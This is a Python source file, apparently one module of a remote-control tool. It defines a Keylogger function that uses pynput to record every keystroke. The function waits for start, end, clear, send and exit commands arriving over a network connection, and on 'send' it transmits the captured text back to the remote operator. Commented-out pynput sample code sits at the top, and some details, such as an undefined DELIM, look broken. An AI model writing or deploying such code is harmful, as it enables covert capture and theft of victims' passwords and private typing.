from pynput import keyboard
from functools import partial

# def on_press(key):
#     try:
#         print('alphanumeric key {0} pressed'.format(
#             key.char))
#     except AttributeError:
#         print('special key {0} pressed'.format(
#             key))

# def on_release(key):
#     print('{0} released'.format(
#         key))
#     if key == keyboard.Key.esc:
#         # Stop listener
#         return False

# # Collect events until released
# with keyboard.Listener(
#         on_press=on_press,
#         on_release=on_release) as listener:
#     listener.join()

# # ...or, in a non-blocking fashion:
# listener = keyboard.Listener(
#     on_press=on_press,
#     on_release=on_release)
# listener.start()
# def activate(name1, name2):
#     with Listener(on_press=lambda event: on_press(event, left=name1, right=name2)) as listener:
#         listener.join()

def Keylogger(buff):
    def on_press(key):
        nonlocal string
        try:
            string += key.char
        except AttributeError:
            _key = str(key).split('.')[1].upper()

            if _key == 'ENTER':
                string += f'[{_key}]\n'
            elif key == 'SPACE':
                string += ' '
            else:
                string += f'[{_key}]>'

    print('KEYLOGGER FUNCTION')
    string = ''
    listener = keyboard.Listener(on_press = on_press)

    while True:
        flag = buff.recv_until(DELIM).decode()
        print(f'\tReceive: {flag}')
        
        if flag == 'start':
            listener.start()
        elif flag == 'end':
            listener.stop()
        elif flag == 'clear':
            string = ''
        elif flag == 'send':
            buff.send(string.encode())
        elif flag == 'exit':
            break

